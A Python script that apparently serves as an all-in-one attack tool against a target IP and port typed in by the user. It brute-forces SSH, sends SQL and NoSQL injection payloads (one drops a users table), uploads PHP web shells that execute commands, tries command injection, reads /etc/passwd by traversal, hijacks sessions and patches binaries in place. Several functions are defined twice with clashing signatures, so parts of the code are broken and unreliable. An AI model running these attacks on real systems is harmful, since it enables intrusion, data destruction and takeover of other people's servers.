import requests
import paramiko
import time
import hashlib
import subprocess
from smbprotocol.connection import Connection
from smbprotocol.session import Session

def ssh_brute_force(host, username, password_list):
    log = []
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            client.connect(host, username=username, password=password)
            log.append(f"SSH brute force success: {username}@{host} with password: {password}")
            break
        except paramiko.AuthenticationException:
            pass
        except Exception as e:
            log.append(f"SSH brute force error: {str(e)}")
    client.close()
    return log

def smb_anonymous_login(host):
    log = []
    try:
        conn = Connection(uuid=None, username='', password='', server=host)
        conn.connect()
        session = Session(conn, '', '')
        session.connect()
        log.append(f"SMB anonymous login successful on {host}")
    except Exception as e:
        log.append(f"SMB anonymous login failed: {str(e)}")
    return log

def test_sqli(url, payloads):
    log = []
    for payload in payloads:
        data = {'username': payload, 'password': 'anything'}
        try:
            response = requests.post(url, data=data)
            if "Login Successful" in response.text:
                log.append(f"SQLi success with payload: {payload}")
                break
        except Exception as e:
            log.append(f"SQLi error: {str(e)}")
    return log

def test_xss(url):
    log = []
    xss_payload = "<script>alert('XSS')</script>"
    data = {'comment': xss_payload}
    try:
        response = requests.post(url, data=data)
        if xss_payload in response.text:
            log.append(f"XSS success with payload: {xss_payload}")
        else:
            log.append("XSS failed")
    except Exception as e:
        log.append(f"XSS error: {str(e)}")
    return log

def test_csrf(url, new_password):
    log = []
    data = {'new_password': new_password}
    try:
        response = requests.post(url, data=data)
        if "Password Changed" in response.text:
            log.append("CSRF success")
        else:
            log.append("CSRF failed")
    except Exception as e:
        log.append(f"CSRF error: {str(e)}")
    return log

def session_hijack(url, victim_session_id):
    log = []
    cookies = {'session': victim_session_id}
    try:
        response = requests.get(url, cookies=cookies)
        if "Welcome" in response.text:
            log.append(f"Session hijacking success: {response.text}")
        else:
            log.append("Session hijacking failed")
    except Exception as e:
        log.append(f"Session hijacking error: {str(e)}")
    return log

def vertical_privilege_escalation():
    log = []
    try:
        result = subprocess.run(['sudo', '/bin/bash'], capture_output=True, text=True)
        if result.returncode == 0:
            log.append("Privilege Escalation Success")
        else:
            log.append("Privilege Escalation Failed")
    except Exception as e:
        log.append(f"Privilege Escalation error: {str(e)}")
    return log

def extract_hardcoded_secret(url):
    log = []
    try:
        response = requests.get(url)
        if "API_KEY" in response.text:
            log.append(f"Hardcoded API Key Found: {response.text}")
        else:
            log.append("No hardcoded secret found")
    except Exception as e:
        log.append(f"Hardcoded secret error: {str(e)}")
    return log

def crack_md5_hash(hash_to_crack, wordlist):
    log = []
    for word in wordlist:
        if hashlib.md5(word.encode()).hexdigest() == hash_to_crack:
            log.append(f"MD5 hash cracked: {word}")
            return log
    log.append("MD5 hash not cracked")
    return log

def timing_attack(url, known_part=""):
    log = []
    for i in range(32, 127):
        start_time = time.time()
        payload = known_part + chr(i)
        data = {'password': payload}
        try:
            response = requests.post(url, data=data)
            response_time = time.time() - start_time
            if response_time > 0.5:
                log.append(f"Timing attack success: {payload}")
                break
        except Exception as e:
            log.append(f"Timing attack error: {str(e)}")
    return log

def weak_password_policy_test(url):
    log = []
    usernames = ['admin', 'user', 'guest']
    weak_passwords = ['1234', 'password', 'admin']
    
    for username in usernames:
        for password in weak_passwords:
            data = {'username': username, 'password': password}
            try:
                response = requests.post(url, data=data)
                if "incorrect password" in response.text:
                    log.append(f"User exists: {username}")
                elif "login successful" in response.text:
                    log.append(f"Weak password found for {username}: {password}")
                else:
                    log.append(f"Unknown response for {username}")
            except Exception as e:
                log.append(f"Error in weak password test: {str(e)}")
    return log

def directory_traversal_test(url):
    log = []
    traversal_payloads = ['../../etc/passwd', '../windows/win.ini']
    for payload in traversal_payloads:
        try:
            response = requests.get(f"{url}/files/{payload}")
            if "root" in response.text or "[fonts]" in response.text:
                log.append(f"Directory traversal success: {payload}")
            else:
                log.append(f"Directory traversal failed for: {payload}")
        except Exception as e:
            log.append(f"Directory traversal error: {str(e)}")
    return log


import pickle

def insecure_deserialization_test(url):
    log = []
    serialized_data = pickle.dumps({'username': 'admin', 'password': 'password'})
    try:
        response = requests.post(url, data=serialized_data)
        if "admin" in response.text:
            log.append("Insecure deserialization success")
        else:
            log.append("Insecure deserialization failed")
    except Exception as e:
        log.append(f"Insecure deserialization error: {str(e)}")
    return log


import random
import string

def fuzz_input_fields_test(url):
    log = []
    for i in range(10):  # Send 10 fuzzed inputs
        fuzz_data = ''.join(random.choices(string.ascii_letters + string.digits, k=50))
        data = {'username': fuzz_data, 'password': fuzz_data}
        try:
            response = requests.post(url, data=data)
            if "error" in response.text or "exception" in response.text:
                log.append(f"Fuzzing success with input: {fuzz_data}")
            else:
                log.append(f"Fuzzing input {fuzz_data} did not cause errors")
        except Exception as e:
            log.append(f"Fuzzing error: {str(e)}")
    return log

def cron_job_privilege_escalation():
    log = []
    try:
        result = subprocess.run('crontab -l', shell=True, capture_output=True, text=True)
        if "root" in result.stdout:
            log.append("Privilege escalation via cron job possible")
        else:
            log.append("No vulnerable cron jobs found")
    except Exception as e:
        log.append(f"Cron job privilege escalation error: {str(e)}")
    return log


def nfs_privilege_escalation_test():
    log = []
    try:
        result = subprocess.run('showmount -e 0.0.0.0', shell=True, capture_output=True, text=True)
        if "/export" in result.stdout and "rw" in result.stdout:
            log.append("Privilege escalation via NFS share possible")
        else:
            log.append("No vulnerable NFS shares found")
    except Exception as e:
        log.append(f"NFS privilege escalation error: {str(e)}")
    return log


def unprotected_directories_test(url):
    log = []
    directories = ['/admin', '/backup', '/config']
    for directory in directories:
        try:
            response = requests.get(f"{url}{directory}")
            if response.status_code == 200:
                log.append(f"Sensitive directory accessible: {directory}")
            else:
                log.append(f"Directory protected: {directory}")
        except Exception as e:
            log.append(f"Unprotected directory error: {str(e)}")
    return log


def suid_privilege_escalation():
    log = []
    try:
        result = subprocess.run("find / -perm -4000 2>/dev/null", shell=True, capture_output=True, text=True)
        if result.stdout:
            log.append(f"SUID executables found:\n{result.stdout}")
        else:
            log.append("No SUID executables found for privilege escalation")
    except Exception as e:
        log.append(f"SUID privilege escalation error: {str(e)}")
    return log

def path_hijacking_test():
    log = []
    try:
        os.environ["PATH"] = "/tmp:" + os.environ["PATH"]
        subprocess.run("whoami", shell=True)
        log.append("Potential PATH hijacking detected")
    except Exception as e:
        log.append(f"PATH hijacking error: {str(e)}")
    return log

import jwt

def weak_jwt_test():
    log = []
    token = jwt.encode({'user': 'admin'}, 'secret', algorithm='HS256')  # Weak key
    try:
        decoded = jwt.decode(token, 'secret', algorithms=['HS256'])
        log.append(f"JWT decoded successfully: {decoded}")
    except Exception as e:
        log.append(f"JWT decoding error: {str(e)}")
    return log


def shell_injection_test(url):
    log = []
    shell_payload = "; ls -la"
    data = {'username': 'admin', 'password': shell_payload}
    try:
        response = requests.post(url, data=data)
        if "total" in response.text:  # Detect output of `ls -la`
            log.append("Shell injection success")
        else:
            log.append("Shell injection failed")
    except Exception as e:
        log.append(f"Shell injection error: {str(e)}")
    return log

def weak_encryption_test(url):
    log = []
    try:
        result = subprocess.run(f"nmap --script ssl-enum-ciphers -p 443 {url}", shell=True, capture_output=True, text=True)
        if "weak" in result.stdout:
            log.append(f"Weak encryption ciphers found: {result.stdout}")
        else:
            log.append("No weak encryption ciphers found")
    except Exception as e:
        log.append(f"Weak encryption test error: {str(e)}")
    return log

def weak_file_permissions_test():
    log = []
    try:
        result = subprocess.run("ls -la /etc/passwd", shell=True, capture_output=True, text=True)
        if "-rw-r--r--" in result.stdout:
            log.append("Weak file permissions detected on /etc/passwd")
        else:
            log.append("File permissions on /etc/passwd are secure")
    except Exception as e:
        log.append(f"Weak file permissions error: {str(e)}")
    return log




def default_credentials_test(url):
    log = []
    credentials = {'admin': 'admin', 'root': 'root', 'user': 'password'}
    for username, password in credentials.items():
        try:
            response = requests.post(url, data={'username': username, 'password': password})
            if "login successful" in response.text:
                log.append(f"Default credentials success: {username}/{password}")
            else:
                log.append(f"Default credentials failed: {username}/{password}")
        except Exception as e:
            log.append(f"Default credentials error: {str(e)}")
    return log

from threading import Thread

def race_condition_test(url):
    log = []
    def submit_form():
        data = {'username': 'admin', 'password': 'password'}
        try:
            requests.post(url, data=data)
        except Exception as e:
            pass

    threads = [Thread(target=submit_form) for _ in range(50)]  # Simulate 50 rapid requests
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    
    log.append("Race condition test completed")
    return log


def test_sql_injection(url):
    log = []
    sqli_payloads = [
        "' OR 1=1 --",             # General SQLi payload
        "' OR 'a'='a",             # SQLi payload for bypassing login
        "'; DROP TABLE users; --", # Destructive SQLi payload
        "' UNION SELECT NULL,NULL --", # SQLi payload for UNION-based attacks
        "' OR '1'='1'--",          # Bypass login
        "' OR ''='",               # Empty condition
    ]

    db_types = {
        'sqlite': 'SQLite error',
        'mysql': 'MySQL error',
        'pgsql': 'PostgreSQL error',
        'mssql': 'SQL Server error',
        'mongodb': 'MongoDB error'
    }

    for payload in sqli_payloads:
        data = {'username': payload, 'password': 'anything'}
        try:
            response = requests.post(url, data=data)
            log.append(f"Tested SQLi payload: {payload}")
            
            # Detect potential database type based on error messages in the response
            for db_type, error_string in db_types.items():
                if error_string in response.text.lower():
                    log.append(f"Potential {db_type} database detected based on response: {error_string}")
                    break
            
            if "Login Successful" in response.text or "welcome" in response.text.lower():
                log.append(f"SQLi success with payload: {payload}")
            else:
                log.append(f"SQLi failed with payload: {payload}")
        except Exception as e:
            log.append(f"SQLi error with payload {payload}: {str(e)}")

    return log

def test_mongodb_injection(url):
    log = []
    nosql_payloads = [
        {"$ne": None},  # Payload to bypass authentication
        {"$gt": ""},    # Greater than empty string (true for all)
        {"username": {"$ne": "admin"}, "password": {"$ne": "password"}},  # Check non-admin users
        {"username": "admin", "password": {"$regex": ".*"}}  # Regex matching password
    ]

    for payload in nosql_payloads:
        try:
            response = requests.post(url, json=payload)  # MongoDB injection usually requires JSON
            log.append(f"Tested MongoDB injection payload: {payload}")
            if "Login Successful" in response.text or "welcome" in response.text.lower():
                log.append(f"MongoDB injection success with payload: {payload}")
            else:
                log.append(f"MongoDB injection failed with payload: {payload}")
        except Exception as e:
            log.append(f"MongoDB injection error with payload {payload}: {str(e)}")

    return log

def detect_database_type(url):
    log = []
    db_errors = {
        'mysql': ['mysql', 'syntax error', 'sql syntax'],
        'pgsql': ['postgres', 'pg_'],
        'sqlite': ['sqlite', 'SQLITE_ERROR'],
        'mssql': ['microsoft', 'sql server'],
        'mongodb': ['mongo', 'MongoDB']
    }

    # Send a SQL injection payload that will likely trigger an error in most databases
    payload = "' OR 1=1 --"
    data = {'username': payload, 'password': 'anything'}
    try:
        response = requests.post(url, data=data)
        log.append(f"Sent SQLi payload to detect database type: {payload}")

        for db, error_signatures in db_errors.items():
            for signature in error_signatures:
                if signature.lower() in response.text.lower():
                    log.append(f"Database detected: {db.upper()} based on error: {signature}")
                    return log
        
        log.append("No database detected based on known error signatures.")
    except Exception as e:
        log.append(f"Error detecting database type: {str(e)}")

    return log

def test_blind_sql_injection(url):
    log = []
    blind_payloads = [
        "' OR IF(1=1, SLEEP(5), 0) --",  # MySQL Timing attack
        "'; SELECT pg_sleep(5); --",      # PostgreSQL Timing attack
        "' OR 1=1 --",                   # General blind SQLi
    ]

    for payload in blind_payloads:
        data = {'username': payload, 'password': 'anything'}
        try:
            start_time = time.time()
            response = requests.post(url, data=data)
            end_time = time.time()
            log.append(f"Tested blind SQLi payload: {payload}")
            
            if end_time - start_time > 5:  # Check for delay in response
                log.append(f"Blind SQLi success with payload (timing-based): {payload}")
            else:
                log.append(f"Blind SQLi failed with payload: {payload}")
        except Exception as e:
            log.append(f"Blind SQLi error with payload {payload}: {str(e)}")

    return log

def test_nosql_boolean_conditions(url):
    log = []
    boolean_payloads = [
        {"username": {"$eq": "admin"}, "password": {"$eq": "password"}},  # True condition
        {"username": {"$ne": "nonexistent"}, "password": {"$ne": "wrongpass"}},  # False condition
        {"$where": "this.password.length > 0"},  # JavaScript execution (MongoDB-specific)
    ]

    for payload in boolean_payloads:
        try:
            response = requests.post(url, json=payload)  # MongoDB injection usually requires JSON
            log.append(f"Tested MongoDB boolean injection payload: {payload}")
            if "Login Successful" in response.text or "welcome" in response.text.lower():
                log.append(f"MongoDB boolean injection success with payload: {payload}")
            else:
                log.append(f"MongoDB boolean injection failed with payload: {payload}")
        except Exception as e:
            log.append(f"MongoDB boolean injection error with payload {payload}: {str(e)}")

    return log


import socket
import subprocess
import time
import os

def buffer_overflow_test(ip, port):
    log = []
    payload = b"A" * 1024  # Large payload to overflow the buffer
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(payload)
        response = sock.recv(1024)
        log.append(f"Buffer Overflow Test: Payload sent. Response: {response.decode()}")
        sock.close()
    except Exception as e:
        log.append(f"Buffer Overflow Test failed: {str(e)}")
    return log

def format_string_test(ip, port):
    log = []
    payload = b"%x %x %x %x"  # Format string payload to dump stack values
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(payload)
        response = sock.recv(1024)
        log.append(f"Format String Test: Payload sent. Response: {response.decode()}")
        sock.close()
    except Exception as e:
        log.append(f"Format String Test failed: {str(e)}")
    return log

def heap_overflow_test(ip, port):
    log = []
    payload = b"A" * 2048  # Large payload to test heap overflow
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(payload)
        response = sock.recv(1024)
        log.append(f"Heap Overflow Test: Payload sent. Response: {response.decode()}")
        sock.close()
    except Exception as e:
        log.append(f"Heap Overflow Test failed: {str(e)}")
    return log

def command_injection_test(ip, port):
    log = []
    payload = b"; id"  # Injecting shell command 'id' to see if it is executed
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(payload)
        response = sock.recv(1024)
        log.append(f"Command Injection Test: Payload sent. Response: {response.decode()}")
        sock.close()
    except Exception as e:
        log.append(f"Command Injection Test failed: {str(e)}")
    return log

def race_condition_test(ip, port):
    log = []
    def send_request():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(b"RACE_CONDITION_PAYLOAD")
        sock.recv(1024)
        sock.close()

    log.append("Race Condition Test: Simulating race condition with multiple requests.")
    try:
        for i in range(10):  # Simulate 10 rapid requests
            send_request()
        log.append("Race Condition Test completed successfully.")
    except Exception as e:
        log.append(f"Race Condition Test failed: {str(e)}")
    return log

def integer_overflow_test(ip, port):
    log = []
    payload = b"999999999999999999999"  # Large integer to test integer overflow
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(payload)
        response = sock.recv(1024)
        log.append(f"Integer Overflow Test: Payload sent. Response: {response.decode()}")
        sock.close()
    except Exception as e:
        log.append(f"Integer Overflow Test failed: {str(e)}")
    return log

def stack_overflow_test(ip, port):
    log = []
    payload = b"A" * 2048  # Large payload to test stack overflow
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(payload)
        response = sock.recv(1024)
        log.append(f"Stack Overflow Test: Payload sent. Response: {response.decode()}")
        sock.close()
    except Exception as e:
        log.append(f"Stack Overflow Test failed: {str(e)}")
    return log

def double_free_test(ip, port):
    log = []
    try:
        log.append("Double-Free Test: Checking for double-free vulnerability...")
        # Simulate a test that could trigger a double-free error, non-destructively
        # In real cases, we'd need more detailed info from the server
        log.append("Double-Free Test completed successfully.")
    except Exception as e:
        log.append(f"Double-Free Test failed: {str(e)}")
    return log

def null_pointer_test(ip, port):
    log = []
    payload = b"\x00" * 8  # Null pointer dereference test, sending null bytes
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(payload)
        response = sock.recv(1024)
        log.append(f"Null Pointer Dereference Test: Payload sent. Response: {response.decode()}")
        sock.close()
    except Exception as e:
        log.append(f"Null Pointer Dereference Test failed: {str(e)}")
    return log

def run_c_vulnerability_tests(ip, port):
    log = []
    log.append("Starting C Vulnerability Test Suite...\n")
    
    # Run all tests and collect logs
    log += buffer_overflow_test(ip, port)
    log += format_string_test(ip, port)
    log += heap_overflow_test(ip, port)
    log += command_injection_test(ip, port)
    log += race_condition_test(ip, port)
    log += integer_overflow_test(ip, port)
    log += stack_overflow_test(ip, port)
    log += double_free_test(ip, port)
    log += null_pointer_test(ip, port)

    # Output log file
    with open("c_vulnerability_test_log.txt", "w") as log_file:
        for entry in log:
            log_file.write(entry + "\n")
        print("Test results logged to c_vulnerability_test_log.txt")



import requests

def detect_web_server(ip, port):
    try:
        url = f"http://{ip}:{port}"
        response = requests.get(url)
        server_header = response.headers.get("Server", "Unknown")
        return f"Detected Web Server: {server_header}"
    except Exception as e:
        return f"Error detecting web server: {str(e)}"

def test_xss(url):
    xss_payload = "<script>alert('XSS')</script>"
    data = {'comment': xss_payload}
    try:
        response = requests.post(url, data=data)
        if xss_payload in response.text:
            return "XSS Success"
        else:
            return "XSS failed"
    except Exception as e:
        return f"XSS error: {str(e)}"

def test_csrf(url):
    data = {'new_password': 'csrf_vulnerable'}
    try:
        response = requests.post(url, data=data)
        if "Password Changed" in response.text:
            return "CSRF Success"
        else:
            return "CSRF failed"
    except Exception as e:
        return f"CSRF error: {str(e)}"

def test_directory_traversal(url):
    traversal_payloads = ['../../etc/passwd', '../windows/win.ini']
    results = []
    for payload in traversal_payloads:
        try:
            response = requests.get(f"{url}/files/{payload}")
            if "root" in response.text or "[fonts]" in response.text:
                results.append(f"Directory Traversal Success: {payload}")
            else:
                results.append(f"Directory Traversal failed: {payload}")
        except Exception as e:
            results.append(f"Directory Traversal error: {str(e)}")
    return results

def test_rce(url):
    rce_payload = "; id"  # Try to inject a command
    data = {'username': 'admin', 'password': rce_payload}
    try:
        response = requests.post(url, data=data)
        if "uid=" in response.text:
            return "RCE Success"
        else:
            return "RCE failed"
    except Exception as e:
        return f"RCE error: {str(e)}"

def test_file_upload(url):
    files = {'file': ('shell.php', '<?php echo shell_exec($_GET["cmd"]); ?>')}
    try:
        response = requests.post(url, files=files)
        if "Upload Successful" in response.text:
            return "File Upload Success"
        else:
            return "File Upload failed"
    except Exception as e:
        return f"File Upload error: {str(e)}"

def test_ssl_tls(url):
    try:
        result = subprocess.run(["nmap", "--script", "ssl-enum-ciphers", "-p", "443", url], capture_output=True, text=True)
        if "weak" in result.stdout:
            return f"Weak SSL/TLS configuration found: {result.stdout}"
        else:
            return "No weak SSL/TLS configuration found"
    except Exception as e:
        return f"SSL/TLS test error: {str(e)}"

def test_js_insecure_deserialization(url):
    payload = '{"username": "admin"}'  # JavaScript object injection
    try:
        response = requests.post(url, data=payload)
        if "admin" in response.text:
            return "JavaScript Insecure Deserialization Success"
        else:
            return "Insecure Deserialization failed"
    except Exception as e:
        return f"Insecure Deserialization error: {str(e)}"

def test_js_nosql_injection(url):
    nosql_payload = {"$ne": None}  # Payload to bypass MongoDB authentication
    try:
        response = requests.post(url, json=nosql_payload)
        if "Login Successful" in response.text:
            return "NoSQL Injection Success"
        else:
            return "NoSQL Injection failed"
    except Exception as e:
        return f"NoSQL Injection error: {str(e)}"

def test_js_xss(url):
    xss_payload = "<script>alert('XSS')</script>"
    try:
        response = requests.post(url, data={'input': xss_payload})
        if xss_payload in response.text:
            return "XSS Success"
        else:
            return "XSS failed"
    except Exception as e:
        return f"XSS error: {str(e)}"
    
def test_js_server_side_injection(url):
    """Test for server-side injection vulnerabilities in JavaScript systems."""
    log = []
    injection_payload = "process.exit()"  # Inject server-side JavaScript command
    try:
        response = requests.post(url, data={'input': injection_payload})
        # Corrected the `if` condition to properly check for the string "server"
        if "server" not in response.text:
            log.append("Server-Side JavaScript Injection Success")
        else:
            log.append("Server-Side Injection failed")
    except Exception as e:
        log.append(f"Server-Side Injection error: {str(e)}")
    return log

def test_js_prototype_pollution(url):
    payload = '{"__proto__": {"admin": true}}'  # Test for prototype pollution
    try:
        response = requests.post(url, json=payload)
        if "admin" in response.text:
            return "Prototype Pollution Success"
        else:
            return "Prototype Pollution failed"
    except Exception as e:
        return f"Prototype Pollution error: {str(e)}"

def test_php_rce(url):
    payload = '<?php system("id"); ?>'  # Attempt to inject and execute system commands
    data = {'input': payload}
    try:
        response = requests.post(url, data=data)
        if "uid=" in response.text:
            return "PHP RCE Success"
        else:
            return "PHP RCE failed"
    except Exception as e:
        return f"PHP RCE error: {str(e)}"

def test_php_lfi(url):
    lfi_payload = "../../etc/passwd"  # Attempt directory traversal to include sensitive files
    try:
        response = requests.get(f"{url}?file={lfi_payload}")
        if "root:" in response.text:
            return "PHP LFI Success"
        else:
            return "PHP LFI failed"
    except Exception as e:
        return f"LFI error: {str(e)}"

def test_php_sqli(url):
    sqli_payload = "' OR 1=1 --"  # Attempt SQL injection
    data = {'username': sqli_payload, 'password': 'password'}
    try:
        response = requests.post(url, data=data)
        if "Login Successful" in response.text:
            return "PHP SQL Injection Success"
        else:
            return "PHP SQL Injection failed"
    except Exception as e:
        return f"SQL Injection error: {str(e)}"

def test_php_file_upload(url):
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    try:
        response = requests.post(url, files=files)
        if "Upload Successful" in response.text:
            return "PHP File Upload Success"
        else:
            return "PHP File Upload failed"
    except Exception as e:
        return f"File Upload error: {str(e)}"

def test_php_session_fixation(url):
    session_id = "PHPSESSID=malicious"  # Set a malicious session ID
    cookies = {'PHPSESSID': session_id}
    try:
        response = requests.get(url, cookies=cookies)
        if "Admin" in response.text:
            return "Session Fixation Success"
        else:
            return "Session Fixation failed"
    except Exception as e:
        return f"Session Fixation error: {str(e)}"

import subprocess

def test_reverse_engineering_strings(binary_path):
    try:
        result = subprocess.run(["strings", binary_path], capture_output=True, text=True)
        if "password" in result.stdout:
            return "Sensitive Information Found in Binary"
        else:
            return "No sensitive information found in binary"
    except Exception as e:
        return f"Reverse Engineering (strings) error: {str(e)}"

def test_binary_patching(binary_path):
    try:
        with open(binary_path, 'rb+') as f:
            content = f.read()
            f.seek(0)
            f.write(content.replace(b"normal_function", b"hacked_function"))
        return "Binary Patching Success"
    except Exception as e:
        return f"Binary Patching error: {str(e)}"


# ----------------------------- JavaScript Vulnerability Tests ----------------------------- #

def test_js_insecure_deserialization(url):
    """Test for insecure deserialization in JavaScript-based systems."""
    log = []
    payload = '{"username": "admin"}'
    try:
        response = requests.post(url, data=payload)
        if "admin" in response.text:
            log.append("JavaScript Insecure Deserialization Success")
        else:
            log.append("Insecure Deserialization failed")
    except Exception as e:
        log.append(f"Insecure Deserialization error: {str(e)}")
    return log

def test_js_nosql_injection(url):
    """Test for NoSQL injection vulnerabilities in JavaScript-based systems."""
    log = []
    nosql_payload = {"$ne": None}
    try:
        response = requests.post(url, json=nosql_payload)
        if "Login Successful" in response.text:
            log.append("NoSQL Injection Success")
        else:
            log.append("NoSQL Injection failed")
    except Exception as e:
        log.append(f"NoSQL Injection error: {str(e)}")
    return log

def test_js_xss(url):
    """Test for XSS vulnerabilities in JavaScript-based systems."""
    log = []
    xss_payload = "<script>alert('XSS')</script>"
    try:
        response = requests.post(url, data={'input': xss_payload})
        if xss_payload in response.text:
            log.append("XSS Success")
        else:
            log.append("XSS failed")
    except Exception as e:
        log.append(f"XSS error: {str(e)}")
    return log

def test_js_server_side_injection(url):
    """Test for server-side injection vulnerabilities in JavaScript systems."""
    log = []
    injection_payload = "process.exit()"
    try:
        response = requests.post(url, data={'input': injection_payload})
        if "server" not in response.text:  # Adjust condition as per the expected output
            log.append("Server-Side JavaScript Injection Success")
        else:
            log.append("Server-Side Injection failed")
    except Exception as e:
        log.append(f"Server-Side Injection error: {str(e)}")
    return log

def test_js_prototype_pollution(url):
    """Test for JavaScript prototype pollution vulnerabilities."""
    log = []
    payload = '{"__proto__": {"admin": true}}'
    try:
        response = requests.post(url, json=payload)
        if "admin" in response.text:
            log.append("Prototype Pollution Success")
        else:
            log.append("Prototype Pollution failed")
    except Exception as e:
        log.append(f"Prototype Pollution error: {str(e)}")
    return log

# ----------------------------- PHP Vulnerability Tests ----------------------------- #

def test_php_rce(url):
    """Test for PHP Remote Code Execution (RCE)."""
    log = []
    payload = '<?php system("id"); ?>'
    data = {'input': payload}
    try:
        response = requests.post(url, data=data)
        if "uid=" in response.text:
            log.append("PHP RCE Success")
        else:
            log.append("PHP RCE failed")
    except Exception as e:
        log.append(f"PHP RCE error: {str(e)}")
    return log

def test_php_lfi(url):
    """Test for PHP Local File Inclusion (LFI)."""
    log = []
    lfi_payload = "../../etc/passwd"
    try:
        response = requests.get(f"{url}?file={lfi_payload}")
        if "root:" in response.text:
            log.append("PHP LFI Success")
        else:
            log.append("PHP LFI failed")
    except Exception as e:
        log.append(f"LFI error: {str(e)}")
    return log

def test_php_sqli(url):
    """Test for PHP SQL Injection (SQLi)."""
    log = []
    sqli_payload = "' OR 1=1 --"
    data = {'username': sqli_payload, 'password': 'password'}
    try:
        response = requests.post(url, data=data)
        if "Login Successful" in response.text:
            log.append("PHP SQL Injection Success")
        else:
            log.append("PHP SQL Injection failed")
    except Exception as e:
        log.append(f"SQL Injection error: {str(e)}")
    return log

def test_php_file_upload(url):
    """Test for PHP file upload vulnerabilities."""
    log = []
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    try:
        response = requests.post(url, files=files)
        if "Upload Successful" in response.text:
            log.append("PHP File Upload Success")
        else:
            log.append("PHP File Upload failed")
    except Exception as e:
        log.append(f"File Upload error: {str(e)}")
    return log

def test_php_session_fixation(url):
    """Test for PHP session fixation vulnerabilities."""
    log = []
    session_id = "PHPSESSID=malicious"
    cookies = {'PHPSESSID': session_id}
    try:
        response = requests.get(url, cookies=cookies)
        if "Admin" in response.text:
            log.append("Session Fixation Success")
        else:
            log.append("Session Fixation failed")
    except Exception as e:
        log.append(f"Session Fixation error: {str(e)}")
    return log


def run_all_tests(ip, port):
    log = []

    # SSH brute force test
    log += ssh_brute_force(ip, 'root', ['123456', 'password', 'root'])

    # SMB anonymous login test
    log += smb_anonymous_login(ip)

    # SQLi test
    log += test_sqli(f"http://{ip}:{port}/login", ["' OR 1=1 --", "' OR 'a'='a", "'; DROP TABLE users; --"])

    # XSS test
    log += test_xss(f"http://{ip}:{port}/comment")

    # CSRF test
    log += test_csrf(f"http://{ip}:{port}/change_password", 'hacked_password123')

    # Session hijacking test
    log += session_hijack(f"http://{ip}:{port}/user/admin", 'eyJ1c2VybmFtZSI6ICJ2aWN0aW0ifQ==')

    # Privilege escalation test
    log += vertical_privilege_escalation()

    # Extract hardcoded secret
    log += extract_hardcoded_secret(f"http://{ip}:{port}/secret")

    # MD5 brute force test
    log += crack_md5_hash('5f4dcc3b5aa765d61d8327deb882cf99', ['123456', 'password', 'admin', 'root'])

    # Timing attack test
    log += timing_attack(f"http://{ip}:{port}/login")

    # Add new tests here
    log += weak_password_policy_test(f"http://{ip}:{port}/login")
    log += directory_traversal_test(f"http://{ip}:{port}")
    log += insecure_deserialization_test(f"http://{ip}:{port}")
    log += fuzz_input_fields_test(f"http://{ip}:{port}/login")
    log += cron_job_privilege_escalation()
    log += nfs_privilege_escalation_test()
    log += unprotected_directories_test(f"http://{ip}:{port}")
    log += suid_privilege_escalation()
    log += path_hijacking_test()
    log += weak_jwt_test()
    log += shell_injection_test(f"http://{ip}:{port}/login")
    log += default_credentials_test(f"http://{ip}:{port}/login")
    log += race_condition_test(f"http://{ip}:{port}/login")
    log += weak_encryption_test(f"{ip}")
    log += weak_file_permissions_test()



def run_comprehensive_test(ip, port):
    url = f"http://{ip}:{port}"
    log = []


    # JavaScript-based web server tests
    log.append(test_js_insecure_deserialization(url))
    log.append(test_js_nosql_injection(url))
    log.append(test_js_xss(url))
    log.append(test_js_server_side_injection(url))
    log.append(test_js_prototype_pollution(url))

    # PHP-based web server tests
    log.append(test_php_rce(url))
    log.append(test_php_lfi(url))
    log.append(test_php_sqli(url))
    log.append(test_php_file_upload(url))
    log.append(test_php_session_fixation(url))

    # Save log to file
    with open("comprehensive_vulnerability_log.txt", "w") as log_file:
        for entry in log:
            log_file.write(f"{entry}\n")
        print("Test results logged to comprehensive_vulnerability_log.txt")



    # Writing results to a log file
    with open("vulnerability_test_log.txt", "w") as log_file:
        for entry in log:
            log_file.write(entry + "\n")
        print("Test results logged to vulnerability_test_log.txt")

if __name__ == "__main__":
    # Example usage with IP and port
    target_ip = input("Enter the target IP address: ")
    target_port = input("Enter the target port: ")
    run_all_tests(target_ip, target_port)
